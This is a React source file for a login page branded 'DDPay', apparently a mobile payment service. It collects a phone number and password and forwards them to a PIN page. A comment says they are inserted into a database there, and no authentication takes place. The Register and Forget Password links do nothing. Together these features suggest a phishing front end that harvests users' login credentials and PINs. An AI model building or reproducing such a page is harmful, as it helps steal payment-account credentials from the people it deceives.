import { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function LoginPage() {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [agreePrivacy, setAgreePrivacy] = useState(true);
  const [phoneError, setPhoneError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSignIn = async () => {
    setPhoneError("");
    setPasswordError("");

    if (!phone) {
      setPhoneError("Please enter your phone number.");
      return;
    }

    if (!password) {
      setPasswordError("Please enter your password.");
      return;
    }

    setLoading(true);
    // Pass phone & password to PinPage — DB insert happens after PIN is entered
    setTimeout(() => {
      setLoading(false);
      navigate("/pin", { state: { phone, password } });
    }, 400);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-start"
      style={{ background: "hsl(210,25%,93%)", paddingTop: "48px", paddingBottom: "48px" }}
    >
      {/* Logo Card */}
      <div
        className="bg-white rounded-2xl flex items-center justify-center mb-10 overflow-hidden"
        style={{ width: "220px", height: "180px", boxShadow: "0 2px 12px rgba(0,0,0,0.08)" }}
      >
        <img
          src="https://cdn-ai.onspace.ai/onspace/files/FbTXz8eM2zcJYp9HmCNu2K/9888.jpg"
          alt="DDPay Logo"
          style={{ width: "200px", height: "160px", objectFit: "contain" }}
        />
      </div>

      {/* Form Container */}
      <div className="w-full" style={{ maxWidth: "380px", padding: "0 24px" }}>
        {/* Phone Input */}
        <div
          className="flex items-center bg-white rounded-full mb-4 px-4"
          style={{ height: "54px", boxShadow: "0 1px 6px rgba(0,0,0,0.07)" }}
        >
          <svg
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#999"
            strokeWidth="1.8"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="mr-3 flex-shrink-0"
          >
            <circle cx="12" cy="8" r="4" />
            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" />
          </svg>
          <input
            type="tel"
            placeholder="Phone"
            value={phone}
            maxLength={10}
            onChange={(e) => {
              const val = e.target.value.replace(/\D/g, "");
              setPhone(val);
              if (phoneError) setPhoneError("");
            }}
            className="flex-1 outline-none border-none bg-transparent text-base"
            style={{ color: "#333", fontSize: "16px" }}
          />
        </div>
        {phoneError && (
          <p className="text-red-500 text-xs mb-2 pl-4">{phoneError}</p>
        )}

        {/* Password Input */}
        <div
          className="flex items-center bg-white rounded-full mb-2 px-4"
          style={{ height: "54px", boxShadow: "0 1px 6px rgba(0,0,0,0.07)" }}
        >
          <svg
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#999"
            strokeWidth="1.8"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="mr-3 flex-shrink-0"
          >
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
          </svg>
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (passwordError) setPasswordError("");
            }}
            className="flex-1 outline-none border-none bg-transparent text-base"
            style={{ color: "#333", fontSize: "16px" }}
          />
        </div>
        {passwordError && (
          <p className="text-red-500 text-xs mb-2 pl-4">{passwordError}</p>
        )}

        {/* Register + Remember Me Row */}
        <div className="flex items-center justify-between mt-3 mb-4 px-1">
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            style={{ color: "#2eaa6c", textDecoration: "underline", fontSize: "15px" }}
          >
            Register
          </a>
          <label className="flex items-center gap-2 cursor-pointer select-none" style={{ fontSize: "15px", color: "#555" }}>
            <span
              onClick={() => setRememberMe(!rememberMe)}
              className="w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 transition-colors"
              style={{
                borderColor: rememberMe ? "#2eaa6c" : "#ccc",
                backgroundColor: rememberMe ? "#2eaa6c" : "transparent",
              }}
            >
              {rememberMe && (
                <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
                  <path d="M2 5l2.5 2.5L8 3" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              )}
            </span>
            Remember Me
          </label>
        </div>

        {/* Privacy Agreement */}
        <div className="flex items-center justify-center mb-5 gap-2">
          <span
            onClick={() => setAgreePrivacy(!agreePrivacy)}
            className="w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 cursor-pointer transition-colors"
            style={{ backgroundColor: agreePrivacy ? "#2eaa6c" : "#ddd" }}
          >
            {agreePrivacy && (
              <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                <path d="M2 6l3 3 5-5" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            )}
          </span>
          <span style={{ fontSize: "14px", color: "#555" }}>
            Agree
            <a
              href="#"
              onClick={(e) => e.preventDefault()}
              style={{ color: "#2eaa6c", textDecoration: "underline", marginLeft: "2px" }}
            >
              "User Privacy Agreement"
            </a>
          </span>
        </div>

        {/* Sign In Button */}
        <button
          onClick={handleSignIn}
          className="w-full rounded-full font-bold text-white transition-all active:scale-95"
          style={{
            height: "54px",
            fontSize: "18px",
            background: "linear-gradient(135deg, #2eaa6c, #1e8a54)",
            border: "none",
            cursor: "pointer",
            boxShadow: "0 4px 16px rgba(46,170,108,0.35)",
            letterSpacing: "0.5px",
          }}
        >
          {loading ? "Please wait..." : "Sign In"}
        </button>

        {/* Forget Password */}
        <div className="flex justify-center mt-8">
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            style={{ color: "#2eaa6c", textDecoration: "underline", fontSize: "15px" }}
          >
            Forget Password
          </a>
        </div>
      </div>

      {/* Version */}
      <div
        className="mt-auto pt-10"
        style={{ fontSize: "13px", color: "#aaa" }}
      >
        v1.2.2
      </div>


    </div>
  );
}
